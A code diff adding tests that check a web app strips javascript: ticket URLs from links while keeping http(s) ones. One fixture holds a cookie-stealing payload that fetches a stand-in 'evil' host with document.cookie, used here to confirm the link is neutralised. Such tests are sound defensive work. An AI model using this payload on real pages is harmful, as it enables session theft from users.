@@ -1509,3 +1509,27 @@ describe("repo filter — pool refresh pruning", () => {
     expect(screen.queryByText("PROJ-4")).not.toBeInTheDocument();
   });
 });
+
+describe("ticket URL safety", () => {
+  const keyAnchor = () => document.querySelector("a.key") as HTMLAnchorElement;
+
+  it("links a task whose connector gave it an http(s) URL", () => {
+    render(<App />);
+    authed();
+    host({ type: "tasks", filter: "mine", tasks: [mkTask({ key: "PROJ-1", url: "https://jira.example.com/browse/PROJ-1" })] });
+    expect(keyAnchor().getAttribute("href")).toBe("https://jira.example.com/browse/PROJ-1");
+  });
+
+  it("renders no href at all for a javascript: ticket URL", () => {
+    render(<App />);
+    authed();
+    // A connector's `url` is third-party text. index.tsx's capture-phase handler
+    // only intercepts `https?:`, so this is the one scheme it would let through to
+    // navigate — and `javascript:` navigation in a webview is arbitrary script.
+    host({ type: "tasks", filter: "mine", tasks: [mkTask({ key: "PROJ-1", url: "javascript:fetch('//evil?c='+document.cookie)" })] });
+    const a = keyAnchor();
+    expect(a.hasAttribute("href")).toBe(false);
+    // The key is still readable; only its link is gone.
+    expect(a.textContent).toBe("PROJ-1");
+  });
+});
